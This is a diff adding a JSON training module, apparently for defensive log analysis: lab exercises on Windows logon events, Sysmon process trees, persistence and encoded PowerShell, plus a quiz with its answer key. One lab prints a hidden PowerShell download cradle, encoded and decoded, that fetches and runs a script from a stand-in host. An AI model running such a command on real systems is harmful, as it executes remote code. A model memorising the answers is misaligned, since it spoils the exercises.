+     "do": "Filter EventID = 4624 and TargetUserName = administrator",
+     "see": "1 event: 09:05:02Z, IpAddress 203.0.113.50, LogonType 3"
+    },
+    {
+     "do": "Check for a following 4672 with the same LogonId",
+     "see": "4672 at 09:05:02Z: SeDebugPrivilege assigned"
+    },
+    {
+     "do": "Submit finding",
+     "see": "Accepted: brute force then privileged success"
+    }
+   ],
+   "answer": "administrator was brute forced from 203.0.113.50 (71 failures from 09:01:10Z to 09:04:55Z). The first success was at 09:05:02Z over type 3, immediately followed by a privileged logon, so the account is likely compromised.",
+   "hint": "Compare the time of the last 4625 with the first 4624 from the same source."
+  },
+  {
+   "title": "Classify logon types",
+   "sim": "siem",
+   "scenario": "In the SIEM you query 4624 events for fictional domain EXAMPLE. Business hours are 08:00 to 18:00 UTC and RDP should be accessible only from the VPN range 192.0.2.0/24.",
+   "objective": "Flag the suspicious type 10 logon from an external address outside business hours.",
+   "steps": [
+    {
+     "do": "Run: EventCode=4624 | stats count by LogonType",
+     "see": "LogonType 2: 14, 3: 912, 5: 301, 10: 3, 11: 2"
+    },
+    {
+     "do": "Filter LogonType=10 | table _time, user, src_ip",
+     "see": "3 rows listed"
+    },
+    {
+     "do": "Read row 1",
+     "see": "10:15Z jlee 192.0.2.40 (VPN)"
+    },
+    {
+     "do": "Read row 2",
+     "see": "14:02Z sadmin 192.0.2.41 (VPN)"
+    },
+    {
+     "do": "Read row 3",
+     "see": "03:12Z jsmith 198.51.100.88 (external)"
+    },
+    {
+     "do": "Flag row 3 and add note",
+     "see": "Flag saved: external, outside hours, not VPN"
+    }
+   ],
+   "answer": "The suspicious logon is the type 10 event for jsmith from 198.51.100.88 at 03:12Z. It is external, outside business hours and not from the VPN range, so it should be escalated as a possible compromised account.",
+   "hint": "Check the source address range and the time together."
+  },
+  {
+   "title": "Decode PowerShell",
+   "sim": "terminal",
+   "scenario": "Event 4104 contains a PowerShell command with an encoded argument from host WS-22. The terminal provides a Base64 string and tools to decode it safely. The decoded text references a fictional download URL.",
+   "objective": "Decode the command and list the download URL and behavior.",
+   "steps": [
+    {
+     "do": "Type: cat event4104.txt",
+     "see": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA="
+    },
+    {
+     "do": "Type: echo <string> | base64 -d > out.bin",
+     "see": "out.bin written (UTF-16LE data)"
+    },
+    {
+     "do": "Type: iconv -f UTF-16LE -t UTF-8 out.bin",
+     "see": "IEX (New-Object Net.WebClient).DownloadString('http://example.com/s.ps1')"
+    },
+    {
+     "do": "Type: defang url",
+     "see": "hxxp://example[.]com/s[.]ps1"
+    },
+    {
+     "do": "Type: note behavior",
+     "see": "Hidden window, no profile, downloads and executes remote script in memory"
+    },
+    {
+     "do": "Submit",
+     "see": "Accepted: URL hxxp://example[.]com/s.ps1, behavior download cradle with IEX"
+    }
+   ],
+   "answer": "The decoded command is IEX (New-Object Net.WebClient).DownloadString('http://example.com/s.ps1'). It downloads a script from example.com and runs it in memory, with a hidden window and no profile to evade notice.",
+   "hint": "Decode as UTF-16LE, not ASCII."
+  },
+  {
+   "title": "Sysmon process tree",
+   "sim": "log-viewer",
+   "scenario": "A Sysmon feed from host WS-22 includes event 1 records. You must follow ParentProcessId and ProcessGuid from winword.exe to cmd.exe to powershell.exe and decide which step is suspicious.",
+   "objective": "Reconstruct the process tree and name the suspicious step.",
+   "steps": [
+    {
+     "do": "Filter EventID = 1 and sort by time",
+     "see": "6 events listed from 09:29:50Z to 09:30:20Z"
+    },
+    {
+     "do": "Open event 1: explorer.exe -> WINWORD.EXE",
+     "see": "User opened invoice.docm, ProcessGuid {0010}"
+    },
+    {
+     "do": "Open event 2: WINWORD.EXE -> cmd.exe",
+     "see": "cmd.exe /c powershell ... ParentProcessGuid {0010}, ProcessGuid {0020}"
+    },
+    {
+     "do": "Open event 3: cmd.exe -> powershell.exe",
+     "see": "powershell -nop -w hidden -enc ..., ParentProcessGuid {0020}, ProcessGuid {0030}"
+    },
+    {
+     "do": "Open event 4: powershell.exe network event 3",
+     "see": "Connection to 198.51.100.9:443"
+    },
+    {
+     "do": "Mark the suspicious step",
+     "see": "Marked WINWORD.EXE -> cmd.exe; accepted"
+    }
+   ],
+   "answer": "The tree is explorer.exe, WINWORD.EXE, cmd.exe, powershell.exe, then an external connection. The suspicious step is Word spawning cmd.exe, which is unusual and typical of a malicious macro.",
+   "hint": "Follow ParentProcessGuid rather than ProcessId."
+  },
+  {
+   "title": "Find persistence",
+   "sim": "file-explorer",
+   "scenario": "An exported image of fictional host WS-22 contains registry exports, scheduled tasks and services. You must inspect each location and mark the malicious entries.",
+   "objective": "Identify and mark every malicious persistence entry.",
+   "steps": [
+    {
+     "do": "Open Registry/HKCU_Run.reg",
+     "see": "OneDrive: C:\\Users\\jlee\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe (signed)\nUpdater: C:\\Users\\jlee\\AppData\\Roaming\\upd.exe (unsigned)"
+    },
+    {
+     "do": "Open Tasks/",
+     "see": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag (Microsoft)\n\\GoogleUpdateX: powershell -w hidden -f C:\\ProgramData\\x.ps1"
+    },
+    {
+     "do": "Open Services/",
+     "see": "Spooler: C:\\Windows\\System32\\spoolsv.exe\nWinSvcHelper: C:\\Windows\\Temp\\svc.exe (7045 at 09:40Z)"
+    },
+    {
+     "do": "Open Startup/",
+     "see": "desktop.ini only"
+    },
+    {
+     "do": "Select the suspicious entries and click Mark",
+     "see": "3 entries marked: Updater, GoogleUpdateX, WinSvcHelper"
+    },
+    {
+     "do": "Submit",
+     "see": "Accepted: 3 of 3 malicious, 0 false marks"
+    }
+   ],
+   "answer": "Malicious entries are the Run key Updater (unsigned file in AppData), the scheduled task GoogleUpdateX (hidden PowerShell script in ProgramData) and the service WinSvcHelper (binary in Windows\\Temp). OneDrive, ScheduledDefrag and Spooler are legitimate.",
+   "hint": "Check paths and signers; temp or user paths are the clue."
+  }
+ ],
+ "checkpoint": [
+  {
+   "q": "Which log holds events such as 4624 and 4625?",
+   "options": [
+    "Security",
+    "Setup",
+    "Forwarded Events only",
+    "Hardware Events"
+   ],
+   "a": 0,
+   "why": "Authentication audit events are in the Security log."
+  },
+  {
+   "q": "SubStatus 0xC000006A means:",
+   "options": [
+    "Bad password",
+    "Unknown user",
+    "Account disabled",
+    "Time restriction"
+   ],
+   "a": 0,
+   "why": "It indicates a wrong password for a valid user."
+  },
+  {
+   "q": "LogonType 10 indicates:",
+   "options": [
+    "Remote Desktop",
+    "Console logon",
+    "Batch job",
+    "Service"
+   ],
+   "a": 0,
+   "why": "Type 10 is RemoteInteractive."
+  },
+  {
+   "q": "An RC4 (0x17) service ticket in an AES environment may indicate:",
+   "options": [
+    "Kerberoasting",
+    "Disk encryption",
+    "BitLocker",
+    "A reboot"
+   ],
+   "a": 0,
+   "why": "Cracking service tickets offline often uses RC4 tickets."
+  },
+  {
+   "q": "Event 1102 means:",
+   "options": [
+    "The Security log was cleared",
+    "A user logged off",
+    "A service started",
+    "A task ran"
+   ],
+   "a": 0,
+   "why": "1102 is the audit log cleared event."
+  },
+  {
+   "q": "Which Sysmon event reports process creation?",
+   "options": [
+    "1",
+    "3",
+    "10",
+    "22"
+   ],
+   "a": 0,
+   "why": "Event 1 is process creation."
+  },
+  {
+   "q": "Sysmon event 10 is most useful for spotting:",
+   "options": [
+    "Process access such as LSASS reads",
+    "Registry Run keys",
+    "DNS queries",
+    "File deletes"
+   ],
+   "a": 0,
+   "why": "ProcessAccess shows handles opened to other processes."
+  },
+  {
+   "q": "Which event shows PowerShell script block text?",
+   "options": [
+    "4104",
+    "4688",
+    "4625",
+    "7045"
+   ],
+   "a": 0,
+   "why": "4104 contains ScriptBlockText."
+  },
+  {
+   "q": "An -enc argument is Base64 of which encoding?",
+   "options": [
+    "UTF-16LE",
+    "UTF-7",
+    "ASCII only",
+    "Latin-1"
+   ],
+   "a": 0,
+   "why": "PowerShell uses UTF-16LE."
+  },
+  {
+   "q": "Which event ID records a new service installed?",
+   "options": [
+    "7045",
+    "4698",
+    "4720",
+    "4740"
+   ],
+   "a": 0,
+   "why": "7045 is service installed in the System log."
+  }
+ ]
+}
